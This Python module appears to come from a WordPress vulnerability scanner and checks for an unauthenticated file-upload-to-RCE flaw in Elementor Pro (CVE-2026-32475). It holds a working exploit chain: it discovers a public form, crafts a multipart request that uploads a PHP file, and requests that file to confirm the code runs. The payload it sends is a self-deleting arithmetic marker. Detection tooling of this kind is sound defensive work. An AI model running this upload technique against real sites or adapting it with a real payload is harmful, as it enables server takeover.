from __future__ import annotations

import json
import re
import secrets
import urllib.parse
from typing import Any

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import normalize_url, request
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-32475"
NAME = "Elementor Pro unauthenticated arbitrary file upload to RCE"
COMPONENT = "WordPress plugin Elementor Pro"
AFFECTED_RULE = "Elementor Pro through 4.2.1; fixed in 4.2.2"
PATCHED_VERSION = "4.2.2"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
UPLOAD_DIRECTORY = "/wp-content/uploads/elementor/forms/"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    fixed = parse_version_safe(PATCHED_VERSION)
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "PATCHED"


def _plugin_info(plugins: dict[str, Any] | None) -> dict[str, Any]:
    value = (plugins or {}).get("elementor-pro", {})
    return value if isinstance(value, dict) else {}


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    plugin = _plugin_info(plugins)
    if not plugin.get("found"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Elementor Pro was not detected in public assets or metadata.",
            action="No action is required unless Elementor Pro is installed but hidden from public detection.",
        )
    version = plugin.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Elementor Pro {version}, which is within the published affected range."
        action = "Upgrade Elementor Pro to 4.2.2 or newer and inspect the forms upload directory for PHP files."
        confidence = "HIGH"
    elif status == "PATCHED":
        detail = f"Detected Elementor Pro {version}, which includes the CVE-2026-32475 fix."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Elementor Pro was detected, but its version could not be determined."
        action = "Determine the installed version and upgrade to Elementor Pro 4.2.2 or newer."
        confidence = "MEDIUM"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=action,
    )


def extract_form_data(html: str) -> dict[str, Any] | None:
    post = re.search(r'name=["\']post_id["\']\s+value=["\']([^"\']+)', html, re.IGNORECASE)
    form = re.search(r'name=["\']form_id["\']\s+value=["\']([^"\']+)', html, re.IGNORECASE)
    file_inputs = re.findall(r"<input\b[^>]*>", html, re.IGNORECASE)
    for input_tag in file_inputs:
        if not re.search(r'type=["\']file["\']', input_tag, re.IGNORECASE) or re.search(
            r"\brequired\b", input_tag, re.IGNORECASE
        ):
            continue
        field = re.search(r'name=["\']form_fields\[([^\]]+)\](?:\[\])?["\']', input_tag, re.IGNORECASE)
        if post and form and field:
            return {
                "post_id": post.group(1),
                "form_id": form.group(1),
                "field_id": field.group(1),
            }
    return None


def _candidate_pages(target_url: str, timeout: int, proxy: str | None) -> list[str]:
    target = normalize_url(target_url)
    urls = [f"{target}/"]
    response = request(
        f"{target}/?rest_route=/wp/v2/pages&per_page=30&_fields=link",
        timeout=timeout,
        proxy=proxy,
    )
    if response.get("status") == 200:
        try:
            pages = json.loads(response.get("body", ""))
        except (json.JSONDecodeError, TypeError):
            pages = []
        if isinstance(pages, list):
            urls.extend(
                page["link"] for page in pages if isinstance(page, dict) and isinstance(page.get("link"), str)
            )
    return list(dict.fromkeys(urls))


def discover_form(target_url: str, timeout: int, proxy: str | None) -> tuple[str, dict[str, Any]] | None:
    for page_url in _candidate_pages(target_url, timeout, proxy):
        response = request(page_url, timeout=timeout, proxy=proxy)
        if response.get("status") != 200:
            continue
        form = extract_form_data(response.get("body", ""))
        if form:
            return page_url, form
    return None


def _multipart(fields: dict[str, str], field_id: str, filename: str, payload: bytes) -> tuple[str, bytes]:
    boundary = "----ProofCMS" + secrets.token_hex(12)
    chunks: list[bytes] = []
    for name, value in fields.items():
        chunks.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
        )
    upload_name = f"form_fields[{field_id}][]"
    chunks.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{upload_name}"; filename=""\r\n'
        "Content-Type: application/octet-stream\r\n\r\n\r\n".encode()
    )
    chunks.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{upload_name}"; filename="{filename}"\r\n'
        "Content-Type: application/x-php\r\n\r\n".encode()
        + payload
        + b"\r\n"
    )
    chunks.append(f"--{boundary}--\r\n".encode())
    return f"multipart/form-data; boundary={boundary}", b"".join(chunks)


def _directory_php_names(target_url: str, timeout: int, proxy: str | None) -> set[str]:
    response = request(f"{normalize_url(target_url)}{UPLOAD_DIRECTORY}", timeout=timeout, proxy=proxy)
    if response.get("status") != 200:
        return set()
    return set(
        re.findall(r'href=["\']([0-9a-f]{13}\.php)["\']', response.get("body", ""), re.IGNORECASE)
    )


def _response_php_names(body: str) -> set[str]:
    return set(re.findall(r"\b([0-9a-f]{13}\.php)\b", body, re.IGNORECASE))


def run_safe_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    discovered = discover_form(target_url, timeout, proxy)
    if not discovered:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="No public Elementor Pro form with a non-required File Upload field was discovered.",
            action="Upgrade affected Elementor Pro versions and manually review any non-public form pages.",
        )

    page_url, form = discovered
    before = _directory_php_names(target_url, timeout, proxy)
    payload_text, expected = generate_php_math_payload()
    payload_text = payload_text.replace(" ?>", " @unlink(__FILE__); ?>")
    fields = {
        "action": "elementor_pro_forms_send_form",
        "post_id": str(form["post_id"]),
        "form_id": str(form["form_id"]),
        "referer_title": "ProofCMS authorized audit",
        "queried_id": str(form["post_id"]),
        "form_fields[name]": "ProofCMS",
        "form_fields[email]": "proofcms@example.test",
    }
    content_type, body = _multipart(fields, str(form["field_id"]), "proofcms.php", payload_text.encode())
    upload = request(
        f"{normalize_url(target_url)}/wp-admin/admin-ajax.php",
        method="POST",
        headers={
            "Content-Type": content_type,
            "Referer": page_url,
            "Origin": normalize_url(target_url),
            "X-Requested-With": "XMLHttpRequest",
        },
        data=body,
        timeout=timeout,
        proxy=proxy,
    )
    try:
        response_json = json.loads(upload.get("body", ""))
    except (json.JSONDecodeError, TypeError):
        response_json = {}
    accepted = upload.get("status") == 200 and isinstance(response_json, dict) and response_json.get("success") is True
    if not accepted:
        response_detail = json.dumps(response_json, ensure_ascii=False)[:400] if response_json else "non-JSON response"
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                f"The form upload was not accepted as successful (HTTP {upload.get('status', 0)}). "
                f"Response: {response_detail}"
            ),
            action="Upgrade any detected version through 4.2.1 even when active proof is inconclusive.",
        )

    after = _directory_php_names(target_url, timeout, proxy)
    candidates = _response_php_names(upload.get("body", "")) | (after - before)
    for filename in sorted(candidates):
        proof_url = f"{normalize_url(target_url)}{UPLOAD_DIRECTORY}{urllib.parse.quote(filename)}"
        proof = request(proof_url, timeout=timeout, proxy=proxy)
        executed, source_leaked = verify_php_execution(proof.get("body", ""), expected)
        if executed:
            cleanup_check = request(proof_url, timeout=timeout, proxy=proxy)
            cleaned = cleanup_check.get("status") in {404, 410}
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="VULNERABLE",
                confidence="CONFIRMED",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=HAS_EXPLOIT,
                exploit_ran=True,
                proof_url=proof_url,
                uploaded_filename=None if cleaned else filename,
                cleanup_attempted=True,
                cleanup_verified=cleaned,
                detail=(
                    "A randomized arithmetic marker executed successfully. The one-shot proof file was removed "
                    "after execution."
                    if cleaned
                    else "A randomized arithmetic marker executed successfully, but automatic proof-file cleanup "
                    "could not be verified."
                ),
                action=(
                    "Upgrade to Elementor Pro 4.2.2 or newer and inspect the forms upload directory."
                    if cleaned
                    else "Upgrade to Elementor Pro 4.2.2 or newer and delete the reported proof file."
                ),
            )
        if source_leaked:
            break

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="VULNERABLE_UPLOAD_ONLY",
        confidence="CONFIRMED",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        uploaded_filename=next(iter(candidates), None),
        detail=(
            "Elementor returned success for the bypassed PHP upload, but the randomized stored URL was not safely "
            "recoverable for execution verification. Review wp-content/uploads/elementor/forms/ for the proof file."
        ),
        action="Upgrade to Elementor Pro 4.2.2 or newer and remove the uploaded proof file from the forms directory.",
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if passive.status == "NOT_DETECTED" and discover_form(target_url, timeout, proxy):
        passive = passive_result({"elementor-pro": {"found": True, "version": None, "source": "public-form"}})
    if exploit_mode != "safe":
        passive.detail += " This module supports only the one-shot arithmetic proof."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Safe proof skipped because Elementor Pro was not detected as potentially affected."
        return passive
    result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["<=4.2.1"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-09-28",
        "updated": "2026-09-28",
        "required_detectors": [],
        "references": [
            "https://patchstack.com/articles/critical-unauthenticated-file-upload-to-rce-in-elementor-pro-plugin/",
            "https://www.cve.org/CVERecord?id=CVE-2026-32475",
            "https://github.com/absholi7ly/Elementor-Pro-Unauthenticated-Arbitrary-File-Upload-to-RCE",
        ],
    }
